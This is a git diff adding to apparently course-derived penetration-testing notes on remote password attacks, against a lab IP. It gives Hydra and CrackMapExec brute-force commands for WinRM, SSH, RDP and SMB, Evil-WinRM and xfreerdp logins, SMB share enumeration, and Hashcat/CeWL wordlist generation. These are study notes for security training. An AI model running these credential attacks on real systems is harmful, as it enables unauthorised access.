@@ -99,10 +99,96 @@ john --incremental <hash_file>
 
 
 # Remote Password Attacks
-## Network Services
+* Network Services
+* Password Mutations
+* Password Reuse / Default Passwords
+
+# Network Services
 ```
 FTP	SMB	NFS
 IMAP/POP3	SSH	MySQL/MSSQL
 RDP	WinRM	VNC
 Telnet	SMTP	LDAP
 ```
+* WinRM
+* SSH
+* Remote Desktop Protocol (RDP)
+* SMB
+
+## WinRM
+Windows Remote Management (WinRM) is the Microsoft implementation of the network protocol Web Services Management Protocol (WS-Management). It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management (WBEM) and the Windows Management Instrumentation (WMI), which can call the Distributed Component Object Model (DCOM).
+
+* WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).
+
+### CrackMapExec
+```
+sudo apt-get -y install crackmapexec
+crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+crackmapexec winrm 10.129.42.197 -u user.list -p password.list
+```
+
+### Evil-WinRM
+```
+sudo gem install evil-winrm
+evil-winrm -i <target-IP> -u <username> -p <password>
+evil-winrm -i 10.129.42.197 -u user -p password
+```
+
+## SSH
+Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on TCP port 22 by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: symmetric encryption, asymmetric encryption, and hashing.
+
+### Hydra - SSH
+```
+hydra -L user.list -P password.list ssh://10.129.42.197
+```
+
+## Remote Desktop Protocol (RDP)
+Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.
+
+### Hydra - RDP
+```
+ hydra -L user.list -P password.list rdp://10.129.42.197
+ ```
+
+ ### xFreeRDP
+```
+xfreerdp /v:<target-IP> /u:<username> /p:<password>
+```
+
+## SMB
+Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks.
+SMB is also known as Common Internet File System (CIFS). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter Samba, which is an open-source implementation of the above functions. 
+
+### Hydra - SMB
+```
+hydra -L user.list -P password.list smb://10.129.42.197
+```
+
+### Metasploit Framework
+### CrackMapExec
+Now we can use CrackMapExec again to view the available shares and what privileges we have for them.
+```
+crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
+```
+
+### Smbclient
+```
+smbclient -U user \\\\10.129.42.197\\SHARENAME
+```
+
+# Password Mutations
+We can use a very powerful tool called Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. 
+
+## Generating Rule-based Wordlist
+```
+hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+ls /usr/share/hashcat/rules/
+```
+
+## Generating Wordlists Using CeWL
+We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list
+```
+cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+
+
+
